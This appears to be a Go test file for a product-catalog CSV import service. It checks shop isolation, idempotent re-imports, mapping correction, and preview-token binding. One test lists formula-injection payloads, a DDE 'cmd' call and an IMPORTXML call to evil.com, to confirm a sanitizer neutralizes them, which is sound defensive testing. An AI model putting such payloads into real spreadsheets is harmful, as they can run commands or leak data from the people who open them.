package product_test

import (
	"context"
	"strings"
	"testing"

	"github.com/quantm-zeus/creativanta/apps/api/internal/product"
)

// ACCEPTANCE TARGET 1:
// "Two shops with same source ID remain separate"
//
// Verification:
// - Shop A (connected_account_id = "shop-alpha-001") imports product with external ID "ITEM-1001"
// - Shop B (connected_account_id = "shop-beta-002") imports product with identical external ID "ITEM-1001"
// - Both products must be created as distinct entities in the catalog
// - Neither product overwrites or merges into the other
func TestAcceptanceTarget1_TwoShopsWithSameSourceIDRemainSeparate(t *testing.T) {
	ctx := context.Background()
	svc, store, _ := newTestService()

	csvDataShopA := `external_id,title,product_type,price,currency
ITEM-1001,Tai nghe Bluetooth Shop Alpha,physical,250000,VND`

	csvDataShopB := `external_id,title,product_type,price,currency
ITEM-1001,Tai nghe Gaming Shop Beta,physical,490000,VND`

	shopAAccountID := "shop-alpha-001"
	shopBAccountID := "shop-beta-002"

	// 1. Preview and Import Shop A
	prevA, err := svc.Import(ctx, testWorkspaceID1, "tiktok", shopAAccountID, csvDataShopA, nil, "VND", true, "")
	if err != nil {
		t.Fatalf("Shop A preview failed: %v", err)
	}
	resA, err := svc.Import(
		ctx,
		testWorkspaceID1,
		"tiktok",
		shopAAccountID,
		csvDataShopA,
		nil,
		"VND",
		false, // commit
		prevA.PreviewToken,
	)
	if err != nil {
		t.Fatalf("Shop A import failed: %v", err)
	}
	if resA.CreateCount != 1 {
		t.Fatalf("expected 1 created for Shop A, got %d", resA.CreateCount)
	}
	productIDA := resA.CreatedProducts[0].ProductID

	// 2. Preview and Import Shop B with identical external_id ITEM-1001
	prevB, err := svc.Import(ctx, testWorkspaceID1, "tiktok", shopBAccountID, csvDataShopB, nil, "VND", true, "")
	if err != nil {
		t.Fatalf("Shop B preview failed: %v", err)
	}
	resB, err := svc.Import(
		ctx,
		testWorkspaceID1,
		"tiktok",
		shopBAccountID,
		csvDataShopB,
		nil,
		"VND",
		false, // commit
		prevB.PreviewToken,
	)
	if err != nil {
		t.Fatalf("Shop B import failed: %v", err)
	}
	if resB.CreateCount != 1 {
		t.Fatalf("expected 1 created for Shop B, got %d", resB.CreateCount)
	}
	productIDB := resB.CreatedProducts[0].ProductID

	// 3. Verification: The two products must have distinct IDs
	if productIDA == productIDB {
		t.Fatalf("VIOLATION: Shop A and Shop B collided on product ID: %s", productIDA)
	}

	// 4. Verify both exist independently in the store with their own details
	prodA, err := store.GetProduct(ctx, testWorkspaceID1, productIDA)
	if err != nil {
		t.Fatalf("failed to get Shop A product: %v", err)
	}
	prodB, err := store.GetProduct(ctx, testWorkspaceID1, productIDB)
	if err != nil {
		t.Fatalf("failed to get Shop B product: %v", err)
	}

	if prodA.Title != "Tai nghe Bluetooth Shop Alpha" {
		t.Fatalf("Shop A title corrupted: %s", prodA.Title)
	}
	if prodB.Title != "Tai nghe Gaming Shop Beta" {
		t.Fatalf("Shop B title corrupted: %s", prodB.Title)
	}

	if len(prodA.ExternalRefs) == 0 || prodA.ExternalRefs[0].ConnectedAccountID != shopAAccountID {
		t.Fatalf("Shop A connected_account_id missing or invalid")
	}
	if len(prodB.ExternalRefs) == 0 || prodB.ExternalRefs[0].ConnectedAccountID != shopBAccountID {
		t.Fatalf("Shop B connected_account_id missing or invalid")
	}

	t.Log("PASS: Target 1 verified. Two shops importing the same external ID produce separate isolated products.")
}

// ACCEPTANCE TARGET 2:
// "Repeated rows no-op"
//
// Verification:
// - An import containing repeated identical rows only creates the entity once.
// - Re-importing the same CSV yields unchanged_count > 0, create_count == 0, and 0 duplicate rows/events.
func TestAcceptanceTarget2_RepeatedRowsNoOp(t *testing.T) {
	ctx := context.Background()
	svc, store, sink := newTestService()

	csvRepeatedRows := `external_id,title,product_type,price,currency
SKU-REP-01,Son Môi Lì Dưỡng Ẩm,physical,120000,VND
SKU-REP-01,Son Môi Lì Dưỡng Ẩm,physical,120000,VND
SKU-REP-02,Phấn Nước Cushion Che Khuyết Điểm,physical,320000,VND`

	// 1. Initial import with repeated rows in the file
	prev1, err := svc.Import(ctx, testWorkspaceID1, "shopee", "shopee-acc-1", csvRepeatedRows, nil, "VND", true, "")
	if err != nil {
		t.Fatalf("Initial preview failed: %v", err)
	}
	res1, err := svc.Import(
		ctx,
		testWorkspaceID1,
		"shopee",
		"shopee-acc-1",
		csvRepeatedRows,
		nil,
		"VND",
		false, // commit
		prev1.PreviewToken,
	)
	if err != nil {
		t.Fatalf("Initial import failed: %v", err)
	}
	if res1.TotalRows != 3 {
		t.Fatalf("expected 3 total rows, got %d", res1.TotalRows)
	}
	if res1.CreateCount != 2 {
		t.Fatalf("expected 2 created products, got %d", res1.CreateCount)
	}
	if res1.UnchangedCount != 1 {
		t.Fatalf("expected 1 unchanged row from in-file repeat, got %d", res1.UnchangedCount)
	}

	eventsAfterFirst := len(sink.Events())
	if eventsAfterFirst != 2 {
		t.Fatalf("expected exactly 2 product.created events, got %d", eventsAfterFirst)
	}

	// 2. Re-importing the exact same file must completely no-op
	res2, err := svc.Import(
		ctx,
		testWorkspaceID1,
		"shopee",
		"shopee-acc-1",
		csvRepeatedRows,
		nil,
		"VND",
		false, // commit
		prev1.PreviewToken,
	)
	if err != nil {
		t.Fatalf("Re-import failed: %v", err)
	}
	if res2.CreateCount != 0 {
		t.Fatalf("expected 0 created on duplicate import, got %d", res2.CreateCount)
	}
	if res2.UpdateCount != 0 {
		t.Fatalf("expected 0 updated on duplicate import, got %d", res2.UpdateCount)
	}
	if res2.UnchangedCount != 3 {
		t.Fatalf("expected 3 unchanged rows on duplicate import, got %d", res2.UnchangedCount)
	}

	// Zero new events emitted on duplicate run
	eventsAfterSecond := len(sink.Events())
	if eventsAfterSecond != eventsAfterFirst {
		t.Fatalf("expected zero new events on no-op reimport, got %d new events", eventsAfterSecond-eventsAfterFirst)
	}

	// Verify catalog only has 2 items
	list, total, err := store.ListProducts(ctx, testWorkspaceID1, product.ListFilter{}, 50, 0)
	if err != nil {
		t.Fatalf("list products failed: %v", err)
	}
	if total != 2 || len(list) != 2 {
		t.Fatalf("expected exactly 2 items in catalog, got %d (total: %d)", len(list), total)
	}

	t.Log("PASS: Target 2 verified. Repeated rows inside file and subsequent re-imports no-op idempotently.")
}

// ACCEPTANCE TARGET 3:
// "Invalid mappings need correction"
//
// Verification:
// - Missing required header mapping (e.g. column is "ten_hang" and unmapped, so "title" is missing)
// - Preview marks RequiresMappingCorrection = true with detailed mapping error
// - Committing without correction fails with ErrMappingCorrectionNeeded
// - Providing corrected mapping resolves the error and commits successfully
func TestAcceptanceTarget3_InvalidMappingsNeedCorrection(t *testing.T) {
	ctx := context.Background()
	svc, _, _ := newTestService()

	// CSV with non-standard unmapped column header "ten_hang" (not in standard aliases)
	csvCustomHeader := `ma_sp,ten_hang,gia_ban
PROD-ERR-01,Chuột Không Dây Silent,180000`

	// 1. Preview without explicit mapping -> Missing 'title'
	previewRes, err := svc.Import(
		ctx,
		testWorkspaceID1,
		"csv",
		"",
		csvCustomHeader,
		nil, // no custom mappings provided
		"VND",
		true, // preview only
		"",
	)
	if err != nil {
		t.Fatalf("preview should not return system error: %v", err)
	}
	if !previewRes.RequiresMappingCorrection {
		t.Fatal("expected RequiresMappingCorrection to be true for missing title mapping")
	}
	if len(previewRes.MappingErrors) == 0 {
		t.Fatal("expected detailed mapping errors explaining missing title")
	}
	t.Logf("Detected mapping errors: %v", previewRes.MappingErrors)

	// 2. Attempting to commit with unresolved mapping errors must be REJECTED!
	_, err = svc.Import(
		ctx,
		testWorkspaceID1,
		"csv",
		"",
		csvCustomHeader,
		nil,
		"VND",
		false, // attempt commit
		"",
	)
	if err == nil {
		t.Fatal("VIOLATION: commit succeeded despite invalid mapping requiring correction")
	}
	if !strings.Contains(err.Error(), "correction required") && !strings.Contains(err.Error(), "mapping errors") {
		t.Fatalf("unexpected error message: %v", err)
	}

	// 3. User supplies corrected column mapping: "ten_hang" -> "title", "ma_sp" -> "external_id", "gia_ban" -> "base_price"
	correctedMappings := map[string]string{
		"ten_hang": "title",
		"ma_sp":    "external_id",
		"gia_ban":  "base_price",
	}

	// Preview with corrected mappings
	previewCorrected, err := svc.Import(
		ctx,
		testWorkspaceID1,
		"csv",
		"",
		csvCustomHeader,
		correctedMappings,
		"VND",
		true, // preview
		"",
	)
	if err != nil {
		t.Fatalf("preview with corrected mappings failed: %v", err)
	}
	if previewCorrected.RequiresMappingCorrection {
		t.Fatalf("mapping still requires correction after valid mappings: %v", previewCorrected.MappingErrors)
	}
	if previewCorrected.CreateCount != 1 {
		t.Fatalf("expected 1 candidate create in preview, got %d", previewCorrected.CreateCount)
	}
	previewToken := previewCorrected.PreviewToken
	if previewToken == "" {
		t.Fatal("expected non-empty preview token")
	}

	// 4. Commit with valid preview token and corrected mappings succeeds
	commitRes, err := svc.Import(
		ctx,
		testWorkspaceID1,
		"csv",
		"",
		csvCustomHeader,
		correctedMappings,
		"VND",
		false, // commit
		previewToken,
	)
	if err != nil {
		t.Fatalf("commit with corrected mappings failed: %v", err)
	}
	if commitRes.CreateCount != 1 {
		t.Fatalf("expected 1 created product on commit, got %d", commitRes.CreateCount)
	}
	if commitRes.CreatedProducts[0].Title != "Chuột Không Dây Silent" {
		t.Fatalf("product title incorrect: %s", commitRes.CreatedProducts[0].Title)
	}

	t.Log("PASS: Target 3 verified. Invalid mappings flag required correction, block commit, and accept corrections.")
}

func TestSpreadsheetFormulaNeutralization(t *testing.T) {
	maliciousFormulas := []string{
		"=cmd|' /C calc'!A0",
		"+SUM(1+1)",
		"-10*20",
		"@IMPORTXML(\"http://evil.com\",\"//\")",
	}

	for _, f := range maliciousFormulas {
		neutralized := product.NeutralizeFormula(f)
		if neutralized[0] != '\'' {
			t.Fatalf("formula %q was not neutralized with leading single quote: %q", f, neutralized)
		}
	}

	safeText := "Áo sơ mi oxford"
	if product.NeutralizeFormula(safeText) != safeText {
		t.Fatalf("safe text was modified: %s", product.NeutralizeFormula(safeText))
	}
}

func TestPreviewTokenIntegrity(t *testing.T) {
	ctx := context.Background()
	svc, _, _ := newTestService()

	csvData := `title,price,currency
Thảm Yoga TPE 6mm,199000,VND`

	// Commit with wrong token
	_, err := svc.Import(
		ctx,
		testWorkspaceID1,
		"csv",
		"",
		csvData,
		nil,
		"VND",
		false,
		"wrong-invalid-token-12345",
	)
	if err != product.ErrDuplicateImportToken {
		t.Fatalf("expected ErrDuplicateImportToken, got %v", err)
	}
}

func TestRemediation_N4_ImportPreviewTokenRequiredAndBindsCurrency(t *testing.T) {
	ctx := context.Background()
	svc, store, _ := newTestService()

	csvWithoutCurrencyColumn := `external_id,title,price
EXT-N4-1,Đèn Bàn Học Chống Cận,250000`

	// 1. Committing without a preview token must fail closed before mutating the store
	if _, err := svc.Import(
		ctx,
		testWorkspaceID1,
		"csv",
		"",
		csvWithoutCurrencyColumn,
		nil,
		"VND",
		false,
		"",
	); err == nil {
		t.Fatal("N4 regression: expected commit without previewToken to be rejected")
	}

	// 2. Preview with defaultCurrency="VND", then attempt commit with same previewToken but defaultCurrency="USD"
	previewVND, err := svc.Import(
		ctx,
		testWorkspaceID1,
		"csv",
		"",
		csvWithoutCurrencyColumn,
		nil,
		"VND",
		true,
		"",
	)
	if err != nil {
		t.Fatalf("previewVND failed: %v", err)
	}
	if _, err := svc.Import(
		ctx,
		testWorkspaceID1,
		"csv",
		"",
		csvWithoutCurrencyColumn,
		nil,
		"USD",
		false,
		previewVND.PreviewToken,
	); err != product.ErrDuplicateImportToken {
		t.Fatalf("N4 regression: expected ErrDuplicateImportToken when defaultCurrency changed from VND to USD after preview, got %v", err)
	}

	// Verify store still has 0 products
	list, total, err := store.ListProducts(ctx, testWorkspaceID1, product.ListFilter{}, 50, 0)
	if err != nil || total != 0 || len(list) != 0 {
		t.Fatalf("expected 0 products after rejected commits, got total=%d len=%d err=%v", total, len(list), err)
	}

	// 3. Commit with matching defaultCurrency="VND" and previewVND.PreviewToken succeeds
	commitVND, err := svc.Import(
		ctx,
		testWorkspaceID1,
		"csv",
		"",
		csvWithoutCurrencyColumn,
		nil,
		"VND",
		false,
		previewVND.PreviewToken,
	)
	if err != nil || commitVND.CreateCount != 1 {
		t.Fatalf("expected commit with matching VND currency and token to succeed, got res=%+v err=%v", commitVND, err)
	}
	if commitVND.CreatedProducts[0].Currency != "VND" {
		t.Fatalf("expected committed currency VND, got %s", commitVND.CreatedProducts[0].Currency)
	}
}
